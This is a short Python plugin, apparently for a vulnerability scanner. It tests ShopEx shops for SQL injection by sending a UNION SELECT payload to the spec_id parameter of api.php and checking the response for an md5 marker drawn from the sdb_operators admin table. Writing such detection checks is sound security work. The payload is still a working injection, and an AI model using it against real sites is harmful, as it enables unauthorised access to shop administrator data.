#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__author__ = 'xfkxfk'

def assign(service, arg):
    if service == "shopex":
        return True, arg

def audit(arg):
    url = arg
    code, head, body, _, _ = curl.curl('-d spec_id%3D0%20union%20select%20concat%280x23%2Cmd5%283.1415%29%2C0x23%29%2Cconcat%280x23%2Cmd5%283.1415%29%2C0x23%29%2Cconcat%280x23%2Cmd5%283.1415%29%2C0x23%29%20FROM%20sdb_operators%20limit%200%2C1 ' + url + '/api.php?act=get_spec_single&api_version=3.1')
    if code == 200:
        if body and body.find('63e1f04640e83605c1d177544a5a0488') != -1:
            security_hole(url + '/api.php?act=get_spec_single&api_version=3.1')

if __name__ == '__main__':
    from dummy import *
    audit(assign('shopex', 'http://www.example.com/')[1])